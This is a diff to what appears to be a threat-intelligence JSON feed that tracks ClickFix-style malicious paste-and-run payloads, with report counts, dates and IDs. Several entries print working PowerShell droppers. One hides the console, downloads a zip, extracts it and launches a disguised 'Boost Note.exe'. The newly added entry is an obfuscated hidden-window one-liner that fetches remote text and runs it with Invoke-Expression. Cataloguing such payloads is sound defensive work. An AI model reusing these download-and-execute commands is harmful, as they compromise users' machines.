@@ -776,9 +776,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 44,
+    "ReportCount": 45,
     "FirstSeen": "2026-11-10T04:54:46.148000+00:00",
-    "LastSeen": "2026-11-16T10:47:58.057000+00:00",
+    "LastSeen": "2026-11-16T12:14:59.001000+00:00",
     "ReportIds": [
       "cmwa7uhjs07yx0omlfjdv2k9y",
       "cmwafa1yg08ee0omlkfez3dt8",
@@ -823,7 +823,8 @@
       "cmwj33cj016tu0oml5m5v87wb",
       "cmwj36tyq16yb0omldf4pvs2n",
       "cmwj382w016zu0omlgui30fhv",
-      "cmwj53tef17dk0omlyyz1wnrf"
+      "cmwj53tef17dk0omlyyz1wnrf",
+      "cmwj87puz17h00omlv4msyyuh"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -1017,6 +1018,19 @@
     ],
     "PayloadExamples": [
       "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&("
+    ]
+  },
+  {
+    "Pattern": "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-16T12:10:56.873000+00:00",
+    "LastSeen": "2026-11-16T12:10:56.873000+00:00",
+    "ReportIds": [
+      "cmwj82izp17gf0omlbix28awg"
+    ],
+    "PayloadExamples": [
+      "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression"
     ]
   },
   {
